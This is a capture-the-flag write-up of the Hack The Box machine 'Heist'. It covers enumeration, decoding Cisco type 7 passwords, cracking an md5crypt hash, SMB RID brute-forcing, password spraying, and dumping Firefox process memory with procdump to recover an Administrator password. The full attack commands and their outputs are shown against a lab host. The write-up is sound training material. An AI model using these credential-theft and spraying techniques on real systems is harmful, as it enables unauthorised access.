---
machine: Heist
platform: Hack The Box
category: Windows
difficulty: Easy
points: 20
tags: [cisco-type7, smb, rpc-enum, winrm, firefox-procdump]
date: 2026-04-05
status: retired
summary: "An easy Windows box centered on credential hunting across a support portal, leaked network-device configs, and a logged-in desktop application. It exercises Cisco password recovery, SMB/RPC user enumeration, password spraying, and dumping secrets from process memory — a tidy lesson in chaining harvested credentials toward full compromise."
---
## Enumeration

hostscan:
```bash
──(kali㉿kali)-[~/htb/heist]
└─$ nmap 10.129.96.157 -p- -T4 -oN hostscan                
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 08:58 -0400
Nmap scan report for 10.129.96.157
Host is up (0.041s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
49669/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 102.86 seconds

```

Fingerprinting:
```bash
──(kali㉿kali)-[~/htb/heist]
└─$ nmap 10.129.96.157 -p 80,135,445,5985,49669 -T4 -sCV -oN fingerprinting
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-29 09:01 -0400
Nmap scan report for 10.129.96.157
Host is up (0.039s latency).

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
| http-title: Support Login Page
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_clock-skew: -13s
| smb2-time: 
|   date: 2026-05-29T13:02:08
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 95.63 seconds

```

We see we have an IIS server most likely version 10 on port 80, port 445 is probably SMB and 5985 is likely winRM, with 49669 likely being a dynamic port assigned by RPC.  

When inspecting the website source code we see that Login as guest redirects us to `/login.php?quest=true`
`<label> <a class="forget" href="[/login.php?guest=true](view-source:http://10.129.96.157/login.php?guest=true)" title="forget">Login as guest</a> </label>`

So we know the site is using php

While clicking the login button we notice in Network that no calls are made when we click login.

Navigating to /login.php?guest=true redirects to /issues.php which has a messageboard containing an attachment from a user asking the admin to make an account for him on the windows server.  His name is "Hazard"

The attachment contains:
```text
version 12.2
no service pad
service password-encryption
!
isdn switch-type basic-5ess
!
hostname ios-1
!
security passwords min-length 12
enable secret 5 $1$pdQG$o8nrSzsGXeaduXrjlvKc91
!
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408
!
!
ip ssh authentication-retries 5
ip ssh version 2
!
!
router bgp 100
 synchronization
 bgp log-neighbor-changes
 bgp dampening
 network 192.168.0.0Â mask 300.255.255.0
 timers bgp 3 9
 redistribute connected
!
ip classless
ip route 0.0.0.0 0.0.0.0 192.168.0.1
!
!
access-list 101 permit ip any any
dialer-list 1 protocol ip list 101
!
no ip http server
no ip http secure-server
!
line vty 0 4
 session-timeout 600
 authorization exec SSH
 transport input ssh
```

We see a version number: 12.2 
secret 5: `$1$pdQG$o8nrSzsGXeaduXrjlvKc91`
And two accounts:
username rout3r password 7 0242114B0E143F015F5D1E161713
username admin privilege 15 password 7 02375012182C1A1D751618034F36415408

Both passwords fail on crackstation
But the secret comes back as most likely md5 or md5crypt

We attempt to crack that with hashcat mode 500
`hashcat -a 0 -m 500 secrethash /usr/share/wordlists/rockyou.txt`

While we wait on the we try the `rout3r:0242114B0E143F015F5D1E161713` and `admin:02375012182C1A1D751618034F36415408` creds against smb winrm no results

Our hash finally cracks: `stealth1agent`

## Foothold

I tried our users `rout3r`, `admin`, and `Administrators` with the new password against smb and all failed.  Then I remembered that our user from the attachment is named `Hazard` and We get access to smb with `Hazard:stealth1agent`

```bash
┌──(kali㉿kali)-[~/htb/heist]
└─$ nxc smb 10.129.96.157 -u 'Hazard' -p 'stealth1agent'
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:True) (SMBv1:None)                                                                                                                      
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
```

We find that we have access to Read permissions of the IPC$

We read `IPC$`
```bash
┌──(kali㉿kali)-[~/htb/heist]
└─$ @impacket-smbclient Hazard:'stealth1agent'@10.129.96.157       
Impacket v0.14.0.dev0+20260420.123356.9afc09b9 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
IPC$
# use IPC$
# ls
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 InitShutdown
-rw-rw-rw-          4  Sun Dec 31 19:03:58 1600 lsass
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 ntsvcs
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 scerpc
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-364-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 epmapper
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-1dc-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 LSM_API_service
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 eventlog
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-42c-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 atsvc
-rw-rw-rw-          4  Sun Dec 31 19:03:58 1600 wkssvc
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-604-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 spoolss
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-930-0
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 trkwks
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 W32TIME_ALT
-rw-rw-rw-          4  Sun Dec 31 19:03:58 1600 srvsvc
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-26c-0
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 vgauth-service
-rw-rw-rw-          3  Sun Dec 31 19:03:58 1600 ROUTER
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-27c-0
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 gecko-crash-server-pipe.6524
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.0.110239103
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.1.114186722
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.2.18194131
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.3.82394780
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.4.60890498
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.5.165103579
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.6.65261127
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.7.55657131
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.8.115762122
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.9.171118306
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.10.101616044
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6648.0.88720180
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.11.33787890
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.12.95955330
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6788.0.72345903
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6788.1.3380247
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6788.2.96252091
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6788.3.27002694
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 iisipmee4ce5e3-b2e9-407c-9b52-d5e99441b9bd
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.13.122054443
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.14.15244343
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.15.142817156
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.16.73018231
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.17.65911703
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.18.183869134
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.19.116245316
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.7008.0.65025911
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.7008.1.74620509
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.7008.2.28582600
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 iislogpipe2b54f4c4-5bb4-4697-9174-e9dab551c04e
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 IISFCGI-df6a14c9-8e44-4fcd-a8b5-4bf661173453
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.20.131914351
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.21.15391098
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.22.72324104
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.23.57827185
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.24.161851296
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.25.136567926
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6524.26.205595613
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6276.0.150196137
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6276.1.57911991
-rw-rw-rw-          1  Sun Dec 31 19:03:58 1600 chrome.6276.2.88038306
```

And we see alot of files, to me lsass and eventlog seem the most interesting but there are more files we can come back to and investigate later if needed

We cant access any of the files IPC$, with SMB access via Hazard we can do `--rid-brute` for User Enumeration
```bash
┌──(kali㉿kali)-[~/htb/heist/ipc]
└─$ nxc smb 10.129.96.157 -u 'Hazard' -p 'stealth1agent' --rid-brute
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:True) (SMBv1:None)
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      500: SUPPORTDESK\Administrator (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      501: SUPPORTDESK\Guest (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      503: SUPPORTDESK\DefaultAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      504: SUPPORTDESK\WDAGUtilityAccount (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      513: SUPPORTDESK\None (SidTypeGroup)
SMB         10.129.96.157   445    SUPPORTDESK      1008: SUPPORTDESK\Hazard (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1009: SUPPORTDESK\support (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1012: SUPPORTDESK\Chase (SidTypeUser)
SMB         10.129.96.157   445    SUPPORTDESK      1013: SUPPORTDESK\Jason (SidTypeUser)
```

This gives us a user list, we can spray these names against our 3 passwords for smb and winrm

We hit a deadend here and reconsider the other 2 passwords we got from the attachment `password 7` after doing research on the cisco password 7 we see that its actually a vignere cipher that can be easily decoded:  I used this tool to decode them https://passwordrecovery.io/cisco/

We find:
```text
0242114B0E143F015F5D1E161713 -> $uperP@ssword
02375012182C1A1D751618034F36415408 -> Q4)sJu\Y8qz*A3?d
```
We replace these with the hashed counterparts in our password file and try again with the following user and pass file:

```text
┌──(kali㉿kali)-[~/htb/heist]
└─$ cat passlist.txt 
stealth1agent
$uperP@ssword
Q4)sJu\Y8qz*A3?d

┌──(kali㉿kali)-[~/htb/heist]
└─$ cat users.txt   
Hazard
support
Chase
Jason
Administrator
Guest
WDAGUtilityAccount
DefaultAccount
```

We find another cred pair: `Chase:Q4)sJu\Y8qz*A3?d`

```bash
┌──(kali㉿kali)-[~/htb/heist]
└─$ nxc smb 10.129.96.157 -u users.txt -p passlist.txt --continue-on-success
SMB         10.129.96.157   445    SUPPORTDESK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:SUPPORTDESK) (domain:SupportDesk) (signing:True) (SMBv1:None)                                                                                                                      
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Hazard:stealth1agent 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Chase:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Guest:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\WDAGUtilityAccount:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\DefaultAccount:stealth1agent STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Chase:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Guest:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\WDAGUtilityAccount:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\DefaultAccount:$uperP@ssword STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\support:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [+] SupportDesk\Chase:Q4)sJu\Y8qz*A3?d 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Jason:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Administrator:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\Guest:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\WDAGUtilityAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
SMB         10.129.96.157   445    SUPPORTDESK      [-] SupportDesk\DefaultAccount:Q4)sJu\Y8qz*A3?d STATUS_LOGON_FAILURE 
```

This cred pair has access to winrm giving us our user flag
```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> whoami
supportdesk\chase
```

## Privilege Escalation

On Chase' Desktop with the user flag is a todo.txt file:
```powershell
*Evil-WinRM* PS C:\Users\Chase\Desktop> type todo.txt
Stuff to-do:
1. Keep checking the issues list.
2. Fix the router config.

Done:
1. Restricted access for guest user.
```

So maybe guest user may be overprivileged.  We will keep guest users in mind as we progress

Beginning our privesc checklist we find we have normal privileges and groups on our user

While exploring out file system we find PHP to be version 7.3

WinPEAS finds nothing of interest but when I investigate the running processes, I see a firefox session is running.  This is rather odd considering we are WinRM'd onto a windows server.

```powershell
*Evil-WinRM* PS C:\windows\tasks> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    474      18     2296       5216               372   0 csrss
    290      13     1964       4876               484   1 csrss
    357      15     3468      14300              5080   1 ctfmon
    253      14     3936      13156              3764   0 dllhost
    166       9     1880       9640       0.05   6852   1 dllhost
    614      32    30044      55852               964   1 dwm
   1493      58    23860      78624              4976   1 explorer
    355      25    16396      39040       0.17   6276   1 firefox
   1077      70   146568     223740       6.66   6524   1 firefox
    347      19    10240      36440       0.11   6648   1 firefox
    401      33    31540      90936       0.89   6788   1 firefox
    378      28    22384      59240       0.50   7008   1 firefox
     49       6     1784       4560               788   1 fontdrvhost
     49       6     1524       3840               796   0 fontdrvhost
      0       0       56          8                 0   0 Idle
    977      23     6084      14852               636   0 lsass
    223      13     2932       9976              3928   0 msdtc
      0      12      288      14604                88   0 Registry
    144       8     1636       7244              5724   1 RuntimeBroker
    302      16     5432      16736              5816   1 RuntimeBroker
    273      14     3008      14640              6004   1 RuntimeBroker
    663      32    19540      60564              5644   1 SearchUI
    525      11     4996       9392               620   0 services
    683      29    15028      50800              5480   1 ShellExperienceHost
    439      17     4912      23908              4760   1 sihost
     53       3      516       1152               264   0 smss
```

Browsers often contain important credentials so I will dump the memory with procdump and investigate it.

```powershell
*Evil-WinRM* PS C:\Users\Chase\Documents> .\procdump.exe -ma 6524 C:\Users\Chase\Documents\firefox.dmp -accepteula

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[21:10:44] Dump 1 initiated: C:\Users\Chase\Documents\firefox.dmp
[21:10:45] Dump 1 writing: Estimated dump file size is 504 MB.
[21:10:50] Dump 1 complete: 505 MB written in 5.2 seconds
[21:10:50] Dump count reached.
```

I got stuck here for awhile and went down a few rabbit holes of trying to parse firefox.dmp files with no real success due to the sheer volume of strings in the .dmp and lack of logins.json file in Chase' filepath needed to decrypt the credentials.  

I had to bactrack to the beginning where I thought the login page was unresponsive and noticed that it was simply prompting me that the Username needed to be an email.  Opening my network tab I entered `3@gmail.com` with a random password and was brought to a new invalid credentials page.  In the network POST I saw the headers login_username, login_password, and login

If we strings our dmp file and look for `login_password` we get a much more reasonable

```bash
──(kali㉿kali)-[~/htb/heist]
└─$ strings firefox.dmp | grep login_password                  
"C:\Program Files\Mozilla Firefox\firefox.exe" localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
O^privateBrowsingId=1,p,:http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
http://localhost/login.php?login_username=admin@support.htb&login_password=4dD!5}x/re8]FBuZ&login=
```
and we see a repeated usage of the password `4dD!5}x/re8]FBuZ`

We attempt to winrm into Administrator with this password and are greeted with a shell as the Administrator:
```bash
─(kali㉿kali)-[~/htb/heist]
└─$ evil-winrm -i 10.129.96.157 -u 'Administrator' -p '4dD!5}x/re8]FBuZ'
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
supportdesk\administrator
```

From here we can navigate to the desktop and claim our flag!
